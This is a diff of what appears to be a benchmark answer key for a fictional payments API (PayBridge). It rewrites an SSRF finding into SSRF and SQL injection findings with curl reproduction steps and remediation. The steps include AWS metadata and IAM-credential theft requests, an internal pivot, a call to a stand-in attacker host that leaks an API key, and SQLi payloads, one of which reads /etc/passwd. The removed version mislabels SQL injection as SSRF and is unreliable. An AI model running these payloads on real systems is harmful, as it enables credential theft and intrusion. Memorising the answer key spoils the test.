@@ -1,63 +1,71 @@
 # Expected Response
 
 ## System
-- Domain: Fintech / Payments Gateway
-- System: PayBridge Transaction API
+- System: PayBridge Transaction API v2.0.0
+- Domain: FINTECH / PAYMENTS GATEWAY
 - Example ID: INJ-0120
-- Vulnerability: SSRF
+- Risk ID: RISK-INJ-120
 
-## Priority Findings
+## Findings
 
-### Finding 1: SSRF on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. SSRF (Server-Side Request Forgery) on `/api/v1/orders?filter=` — Primary (Declared Vulnerability)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables SSRF (SSRF),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `filter` parameter on `GET /api/v1/orders` is passed directly to a backend `fetch()` call used for payment data enrichment without URL allowlist validation. An attacker can supply an arbitrary URL to make the PayBridge server send authenticated HTTP requests to internal services, cloud metadata endpoints, or attacker-controlled servers — potentially leaking cloud credentials, internal payment processor API keys, or allowing pivot into the internal payments network.
 
-**Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=http://169.254.169.254/latest/meta-data/`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = 'http://169.254.169.254/latest/meta-data/'`
-  evaluates to true for all rows when the payload is `http://169.254.169.254/latest/meta-data/`
+HAR shows `filter=http://169.254.169.254/latest/meta-data/` returning HTTP 200 with SQL order records. The HAR response shows SQL data (SQL code path executed first) rather than metadata content — both injection surfaces are present on the same endpoint. The SSRF surface is confirmed by the fetch() code path documented in Section 3.0.
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
-
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.paybridge-trans.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching payment orders.
 
-### Step 2 — Inject SSRF payload
+**Step 2 — SSRF probe: AWS metadata service (primary HAR attack):**
 ```bash
-curl -s "https://api.paybridge-trans.example.com/api/v1/users?search=http://169.254.169.254/latest/meta-data/" \
+curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://169.254.169.254/latest/meta-data/" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** AWS metadata listing or SQL order records returned (both confirm SSRF/SQLi surfaces). In production SSRF: `ami-id`, `instance-type`, IAM role names exposed.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — SSRF: AWS IAM credential theft:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://169.254.169.254/latest/meta-data/iam/security-credentials/paybridge-service-role" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** `AccessKeyId`, `SecretAccessKey`, `Token` for PayBridge's AWS IAM role — attacker can access S3 transaction records, RDS databases, SQS payment queues.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — SSRF: internal payment processor pivot:**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://internal-payments.paybridge.local/admin/config" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** Internal payment processor admin config exposed — PCI DSS violation (cardholder data environment accessed from external boundary).
+
+**Step 5 — SSRF: out-of-band detection (verify SSRF without reflected response):**
+```bash
+curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=http://attacker-controlled.example.com/ssrf-probe" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** HTTP request logged at attacker server with PayBridge's server IP and `Authorization: Bearer <ENRICHMENT_API_KEY>` header — API key leaked via SSRF.
+
+### 2. SQL Injection on `/api/v1/orders?filter=` — Secondary (Code Snippet Evidence, RISK-INJ-120)
+
+SQL path: raw pg string concatenation. `db_owner` privileges confirmed.
+
+**Step 6 — SQL tautology dump all orders:**
+```bash
+curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter=' OR 1=1 --" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** All payment orders returned including admin account credentials — as evidenced in HAR response.
+
+**Step 7 — Verbose SQL error fingerprint:**
+```bash
+curl -s "https://api.paybridge-trans.example.com/api/v1/orders?filter='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected (RISK-INJ-120 misconfiguration):** SQL syntax error leaking table/column names.
 
 ## Secure Outcome
 ```json
@@ -65,8 +73,8 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- Validate `filter` against a strict URL allowlist before passing to `fetch()` — never accept `169.254.*`, `10.*`, `172.16-31.*`, `127.*` or file:// schemes (RISK-INJ-120).
+- Disable outbound HTTP from the payment API service except to explicitly whitelisted enrichment URLs.
+- Replace raw SQL concatenation with parameterized queries (`pg.query('SELECT ... WHERE filter = $1', [filter])`).
+- Restrict DB account to SELECT/INSERT on required tables (remove `db_owner`).
+- Disable verbose error messages in production.
